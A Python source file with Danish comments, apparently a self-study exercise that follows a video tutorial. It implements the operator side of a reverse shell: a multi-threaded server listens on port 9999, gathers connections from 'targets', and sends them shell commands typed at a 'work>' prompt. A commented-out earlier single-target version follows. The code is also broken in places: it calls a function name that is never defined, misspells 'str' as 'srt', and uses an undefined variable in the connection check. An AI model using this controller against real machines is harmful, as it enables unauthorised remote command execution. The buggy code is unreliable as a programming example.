import socket 
import sys
import threading 
import time
from queue import Queue #<---- python 3 lib

#Guided af TheNewBoston
#https://www.youtube.com/watch?v=42pQmreBYuU

#By Lasse Work Boeg
#25-28/09-17

#For traening og forstaaelse!

#Dette er min server!
#Lav en socket connection (tillader to enheder at kommunikere med hinanden)

#============================================================================
#for at goere det muligt at have flere klienter forbundet til samme server gor vi det multi-threaded
#starter med 2 traade. - forste traad skal haandtere forbindelser og gemme dem i en liste.
#den anden traad skal fungee saa man vealger en klient og skriver en kommando fra serveren til klienten over netvearket.
#============================================================================

#multi threading section:

amount_Of_Threads = 2
Tread_jobs = [1,2]

queue = Queue()

all_connections = [] #<---------- indenholder forbindelses objektet
all_addresses = [] #<-------------- gemmer ip adresse

#===========================================================================

#===========================================================================
#Thread one section start!
def socket_oprettelse():
	try:
		global host
		global port
		global sock
		host = ''
		port = 9999
		sock = socket.socket()
	except socket.error as error_msg:
		print('Din Socket blev ikke lavet korrekt!:' + str(error_msg))

# Method til at sammenkoble min socket til en port. 
# Vent paa en forbindelse fra target maskinen!

def socket_binding():
	try:
		global host
		global port
		global sock
		print('Forbindelse blev bundet sammen med port: ' + str(port))
		sock.bind((host,port))
		#alt informtion er nu bundet sammen
		#vi er nu klar til at lytte efter en forbindelse!
		sock.listen(5)#<--- bestemmer hvor mange gange den tillader en daarlig 
							#forbindelse foer den naegter en ny forbindelse
	except socket.error as error_msg:
		print('Socket blev ikke bundet korrekt' + str(error_msg) + '\n' + 'Forsoeger igen...')
		time.sleep(5)	
		socket_binding()

#metode til at at cleare alle forbindelser
#forste gang man korer denne metode er der ingen som er forbundet og man kan ikke se en effekt
#anden gang man korer denne metode og der allerede er aabne forbindelser, saa skal den ryde alle
#de forbindelser som er i vores lister.
def clear_alle_forbindelser():
	for connections in all_connections:
		connections.close() 
	#vi vil gerne slette vores liste
	del all_connections[:]#<----- [:] = alt | [2:6] et omraade fra 2-6 | [6] slet nr 6
	del all_addresses[:]

#metode til at acceptere og gemme flere brugere paa en liste
def accepter_forbindelser():
	active = True
	while active:
		try:
			conn, address = sock.accept()
			conn.setblocking(1)
			all_connections.append(conn)
			all_addresses.append(address)
			print('\nForbindelse er blevet etableret: ' + address[0])
		except:
			print('Forbindelse blev IKKE etableret korrekt' )
#Thread one section end!
#=========================================================================================

#===========================================================================
#Thread two beskrivelse
#ud fra den forste traad som skal korer konstant i baggrunden
#har jeg en liste over forbundet enheder
#jeg vil kunne have mulighed for at vealge en specifik enhed og lave mine egne 
#custom kommandoer.
#naar jeg er feardig, vil jeg kunne komme tilbage til en slags start for at kunne vealge en ny enhed
#som jeg kan give kommandoer


#============================================================================
#thread two section start - en Interactiv prompt til at give kommandoer til fjeartliggende enheder.
#for at lave mine egne kommandoer navn giver jeg modulet efter mig selv... 'work'
#komandoer bliver derfor = work + kommando!

def work_prompt():
	active = True
	while active:
		cmd = input('work> ')#<--- navngiver hvad der staar i ens promt
		if cmd == 'list': #<---- hvis man skriver list
			list_alle_forbindelser() #<---- vis saa alle ens nuvaerende forbindelser.
		elif 'select' in cmd: #<---- hvis man skriver select og et nummer som ID
			conn = get_target(cmd) #<---- skal den vaelge det target og forbinde til det.
			#naar der er valgt en forbindelse saa skal vi veare sikker paa der rent faktisk er hul igennem
			if conn is not None:
				send_kommando_til_target(conn)
		else:
			print('Kommandoen blev ikke genkendt af systemet')			
		
# metode til at vise alle enheder for er forbundet til serveren
def list_alle_forbindelser():

	resultat = ''
	for i, connection in enumerate(all_connections):#<--- enumerate er en slags counter. foerste
	#foerste gang den korer loopet, vil 'i' veare = 0
		try: #<--- vi vil forsoge at teste alle forbindelser inden de bliver printet
		#for at sikre at forbindelsen er gyldig.
		#for at teste om der er hul igennem sender vi en tom kommando til vores target
			conn.send(str.encode(' '))
			conn.recv(24000)
		except: #<--- hvis forbindelsen er daarlig, saa fjern den fra listen.
			del all_connections[i]
			del all_addresses[i]
			continue #<-- fortseat dit loop.

		#[0] = ip adresse | [1] = port	
		resultat += str(i) + ' ' + str(all_addresses[i][0]) + ' ' + str(all_addresses[i][1]) + '\n'
	print('____Targets____' + '\n' + 'ID Number' + 'Ip Address' + 'Port' + '\n' + resultat) #<--- afslut metoden ved at printe alle gyldige forbindelser til vores prompt

# Vealg et target fra vores liste
def get_selected_target(cmd):
	try:
		target = cmd.replace('select ', '') #<--- replace select med et nummer
		#select er skrevet som en string, saa vi bliver nod til at parse den om til en integer
		target = int(target)
		conn = all_connections[target] #<--- tag vores selected target og forbind til den.
		print('Forbindelse blev etableret til: ' + str(all_connections[target][0]))
		print(str(all_addresses[target][0]) + '> ', end='')#<--- end='' goer saa ens cursor ikke
		#skifter linje af sig selv. 
		return conn
	except:
		print('Dit valg, blev ikke genkendt')





#metode til at sende kommandoer til mit target
def send_kommando_til_target(conn):
	active = True
	while active:
		try:
			cmd = input()
			if len(str.encode(cmd)) > 0:
				conn.send(srt.encode(cmd))
				target_svar = str(conn.recv(24000), 'utf-8')
				print(target_svar, end='')
			if cmd == 'quit':#funktion til at komme tilbage til min work prompt
				break #naar dette loop slutter kommer man tilbage til min work prompt metode
		except:
			print('Forbindelsen blev tabt')
			break
#Thread two selction end
#==========================================================================================			






















"""
# opret nu en forbindelse til target (Socket SKAL lytte efter dem)

def socket_acceptering():
	conn, address = sock.accept()#<--- tillader en ny forbindelse!
	#conn = selve forbindelsen (samtalen)
	#address = den som er forbundet
	print('Forbindelse er blevet etableret | ' + 'IP' + address[0] + '| port ' + str(address[1]))
	send_commands(conn) #<---- naar target er forbundet vil den lytte,
	 					#efter en kommando fra serverens side
	conn.close()

#Naar der er blevet accepteren en forbindelse saa er vi klar til at sende kommandoer til vores target.

#metode til at sende kommandoer.
def send_kommandoer(conn):
	#vi vil gerne kunne blive ved med at sende kommandoer saa
	#vi laver et while true loop.
	while True:
		cmd = input()#<---- det som vi skriver til vores target!
		#cmd er en string. En kommando i en terminal er altid bytes som datatype.
		if cmd == 'quit':
			conn.close()#<---- luk forbindelsen
			sock.close()#<--- luk for socket
			sys.exit()#<---- system kommando for at afslutte
			#konvater bytes (fra cmd) til en string

		#Hvis det skal vises for brugeren saa er det string
		#Naar den skal sendes igennem netvearket saa skal det vaere bytes	
		if len(str.encode(cmd)) > 0:#<--- Hvis laengden af vores string er stoerre end 0

				#encode til en string
			conn.send(str.encode(cmd))#<--- vi sender kommandoen til target som en string
			client_response = str(conn.recv(1024), 'utf-8')		
										#recv = recieve | 1024 = buffer size | 
										#utf-8 = tegnkodning for en normal string

			#print(client_response, end="")#<----- end='' vil fejle hvis vi laver det i python 2, men ikke i python 3

#app start metode - hvad skal programmet goere naar det starter?
def main():
	socket_oprettelse()
	socket_binding()
	socket_acceptering()
	#vi behover ikke "send_commands" metoden her, fordi naar vi acceptere forbindelsen (socket_accept)
	#kalder den allerede send_commands metoden.	
main()		"""

